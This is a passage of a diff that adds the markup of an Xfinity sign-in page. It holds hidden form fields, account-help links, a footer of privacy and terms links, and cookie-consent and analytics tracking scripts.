5u_6S3JeQTajYzMiAnGyG0D4NAgEmMcjwoHGSAUn5g7ZkVWglIu9p-cc06sziXflrnC6oK-3TmNPq2FSP_azgLRlnXqqjqWzPJiA2tfM9yYSUMghM5yvQyB0stMFC7Tpp3b6wdSVyjGORDIJ1KwBDbI9qhtxPbZFR8miOWDYrn5OUNKlKDxYsqRFiShnd84qlBCvSRLkpGctqrL95PDcu1V55N18hF3-2f-l8311V6UdNY1kP41rEx8xT7DFCz849moDYwjURcaSHEMdLOteCE4Lu2bGm5FITXix1wD9dbbI5W6LdZrtO4l8pFrfghSOMD1Dlu4B0TG4-3erbnF1gzi_wvOwADbxysGt6Zk2SeV01hwJYiiV0-v3540dDf6zuXzQyezXk4wBnc3xb28XVaqKKIBVe4ellvVpns2HfFDy8Q6DVn6jmSTGO3AMkFiNrz-r7sWeJU6TT0hYvHFXhiLmWgYWoV1d_Uct731xZ_h3722AvRfot7cowRawB8K-ZYDbIaGBHKFNkgEJbbzVEqDo6Yj_qO0lUt5Dwx6Un6KtasUFMgMZOjLxaB5jqmvjadcRP43UmP_7fQ9ksRd27L9z8cA_zU7SLCyTfsEUpLCqEs3oaoa0uY0IU2hafCOk_qo6eB1eCjWuzG6m6xQ4HaAZSAt8LTzDVk2igkO_oHtnwMvqQNghgRimXmD-2CXPoqTJFkLGYeT3siv3F5zdLKNqPHXmitatualtYQo6LTkgoMiuCx_yjEbu88zy_pNqNAx4JR7DfFwPCPv8CDJ3hy-a6OJYYLDi0iLwwPTKNUxgG6TKzpX4eMjmLWy9lGqJ85RiyLlFIN7lUEao2VDLU9HpeHQq6dZCxoYySK18e9CoPennQpEIyWGieyyX79dA4lc164g3K-k2E20KXsEyJoiR0IrS7uTlOrGbAIRMpGGTQ6Y469CvDrqzO6ESSqPQvVMBPXexzwn3Rpmf3vnFTqkc8gs0JZ_otdY4YlRFCfJ8W24o77oPuL8DF5rfRWKX4EHy4coC6r56ffgVLyWU0nmeuQw2rWqZ0Pw1T-aFrsFnsZKMVhncTJI15DmMmCeE9yhQcgxo0b0p3vng7V-Bo90bc6s1yL23Xyshpnltnu4K9yIxiXcejC44QFoQE3fTx3R97k53OhiyOD6ed8f5yKNKv_t9RIvVQ2ifM8m1E9IdG4V6YAvwX7jWVZNX_LZJQJUA5UQ0S1F6wojFycaXnvzrT-j6biwFaB-Aym-GCp6MzGSW-GVuuow6zlb3-cP-ay-XCOg8tF85sNRS8n1lNjwFcYTgbuR7Ik5fzY5ykuIOHSzkrtUBVf4n_AXuY6egvtDwMugJKEEe0FNlvREtmlCK4hJADzsxLVM9321Zk3ssD7fYVcEFFm55CrN1drTx1F5PZlULsmyDZko_OC8CZy8t7VNIjf2qLCHl01XFGtiW4vN8l5yvWHpVTlP9_YFv2ClMt-w08Nw0vFYe7g_nrSnXgYPt1jjnxIPLkF8msPLvNKI7sS2GnOwrXWdL7A7gGn4a9PsXz5AAKBxOUbxGESMQLRRFVMjvyayJuSCJzMi58xI0oH-F358mvx6LAT2moSQhHs2wXb2eU2LSYKE2EDYHdQPuSDVSG9awU0XMwTViou6J_GaJX46qC6V0VfVB9f9ssW_88vXjx0UjM4ghyg7coscriKY99S-64aCM8_5031fT8SIkHX_XnPw02pa9tGCPZXrli_oRRWoau_ammgwgT3t50D_Dcaooy-_urvP5p1u0kOtSETE6W1_Wjk_nogYR0S0gCq1u20jVjoypt6M98wC6jWEv2b7YminGi5Wr961VV4InHEdufjjiCbWruRN3kp66BHh74Y87rceDIgyaAdf0zGaOYF0xcS_CGKUEBq0oe86cXvsx_j8t8YwyIFVAfwPYTH1P6mYhpZwlk2_xG7U28JKW7qZQ_ENvP_vWyibsdK56OEw">
+					<input type="hidden" name="lang" value="en">
+					<input type="hidden" name="passive" value="false">
+					<input type="hidden" name="flowId" value="e93cdc1d-65bf-4648-8494-36bec671c418">
+					<input type="hidden" name="reqId" value="1e381469-5ad9-46e3-ad1c-224b8395a7bd">
+			</form>
+
+			<prism-lineitem id="non-subscriber-item" tag="a"
+						label="New to Xfinity? View exclusive offers near you"
+						href="https://digital.xfinity.com/offers/plan-builder?intcmp=ILC:ACQ:BAUP:NON:GEN:GEN:COM:NA:and:6211652102"
+						target="_self">
+			    <script type="tracking-data-component" data-tracking-append>
+    [{
+        "componentInfo":{
+            "componentID": "nonSubItem"
+                            , "componentName": "Non-Subscriber Link"
+                    }
+    }]
+    </script>
+		</prism-lineitem>
+	
+	
+		
+	
+	<prism-lineitem id="quick-bill-pay" tag="a" class="hidden"
+					label="Pay any balance without signing in"
+					href="https://customer.xfinity.com/lite" target="_self">
+	</prism-lineitem>
+
+		
+		
+		
+	<prism-lineitem id="forgot-xfinity-id-item" tag="a"
+			label="Find your Xfinity ID"
+			href="https://idm.xfinity.com/myaccount/lookup?continue=https%3A%2F%2Flogin.xfinity.com%2Flogin%3FselectAccount%3Dfalse%26ipAddrAuthn%3Dfalse%26passive%3Dfalse%26reqId%3D1e381469-5ad9-46e3-ad1c-224b8395a7bd%26r%3Dcomcast.net%26s%3Dportal%26deviceAuthn%3Dfalse%26continue%3Dhttp%253A%252F%252Fxfinity.comcast.net%252F%26forceAuthn%3D0%26lang%3Den%26rm%3D2%26ui_style%3Dlight&lang=en&ui_style=light" target="_self">
+	</prism-lineitem>
+
+	<prism-lineitem id="create-username-item" tag="a"
+			label="Create a new Xfinity ID"
+			href="https://idm.xfinity.com/myaccount/create-uid?continue=https%3A%2F%2Flogin.xfinity.com%2Flogin%3FselectAccount%3Dfalse%26ipAddrAuthn%3Dfalse%26passive%3Dfalse%26reqId%3D1e381469-5ad9-46e3-ad1c-224b8395a7bd%26r%3Dcomcast.net%26s%3Dportal%26deviceAuthn%3Dfalse%26continue%3Dhttp%253A%252F%252Fxfinity.comcast.net%252F%26forceAuthn%3D0%26lang%3Den%26rm%3D2%26ui_style%3Dlight&lang=en&ui_style=light" target="_self">
+	</prism-lineitem>
+</div>
+
+		</div>
+					</main>
+																					<footer>
+<div class="footer-content">
+<div class="logo"></div>
+<prism-text priority="secondary">© 2023 Comcast</prism-text>
+<nav>
+<div class="footer-links">
+<prism-button display="link" href="http://my.xfinity.com/terms/web/" status="neutral">
+<prism-icon slot="icon" name="news" theme="outline" status="neutral" size="xs"></prism-icon>
+<prism-text>Web terms of service</prism-text>
+</prism-button>
+<prism-button display="link" href="http://xfinity.comcast.net/privacy/" status="neutral">
+<prism-icon slot="icon" name="privacypolicy" theme="outline" status="neutral" size="xs"></prism-icon>
+<prism-text>Privacy Policy</prism-text>
+</prism-button>
+<prism-button display="link" href="https://www.xfinity.com/privacy/policy/staterights#california" status="neutral">
+<prism-icon slot="icon" name="compare_plans" theme="outline" status="neutral" size="xs"></prism-icon>
+<prism-text>CA Notice at collection</prism-text>
+</prism-button>
+</div>
+<div class="footer-links">
+<prism-button display="link" href="https://www.xfinity.com/privacy/manage-preference" status="neutral">
+<prism-icon slot="icon" name="privacysettings" theme="outline" status="neutral" size="xs"></prism-icon>
+<prism-text>Your privacy choices</prism-text>
+</prism-button>
+<prism-button display="link" href="https://my.xfinity.com/adinformation" status="neutral">
+<prism-icon slot="icon" name="ad_choices" theme="outline" status="neutral" size="xs"></prism-icon>
+<prism-text>Ad choices</prism-text>
+</prism-button>
+</div>
+</nav>
+</div>
+</footer>
+								
+		
+				<script type="module">
+		  import initCookieConsent from "/static/ui-common/cookie-consent-ce41cd1.js";
+		  initCookieConsent(
+			  "a76cdf55-ebf2-44a8-890a-2b5167b45b18",
+			  "Cookie Preferences",
+			  "en"
+		  );
+		</script>
+	
+		
+				
+                    <script type="text/javascript" src="https://static.cimcontent.net/data-layer/?appID=login"></script>
+    
+	<script type="tracking-data-digitalData">
+		{
+			"page" : {
+				"pageInfo" : {
+					"screenName" : "enter xfinity id",
+					"language" : "en",
+					"referrerId" : "portal"
+				 },
+				 "category" : {
+                    "primaryCategory" : "login",
+                                                            "designType" : "responsive",
+                    "businessType" : "resi",
+                    "siteType" : "selfservice"
+                },
+                "affiliate" : {
+                    "name": "comcast",
+                    "channel" : "web"
+                },
+                "codebase" : {
+                    "name" : "cima login"
+                }
+                			},
+			"user" : [{
+				"profile" : [{
+					"profileInfo" : {
+						"authenticationType" : "unauthenticated",
+						"recognizationType" : "unrecognized"
+					}
+				}],
+				"segment" : {
+					"isLocalized" : false
+				}
+			}],
+			"schemaVersion" : 0.18
+		}
+
+	</script>
+    <script>
+	    document.addEventListener("DOMContentLoaded", function () {
+		    document.dispatchEvent(new CustomEvent("c-tracking-log-page", {
+			    bubbles: true
+		    }));
+	    });
+            </script>
+	</body>
 </html>
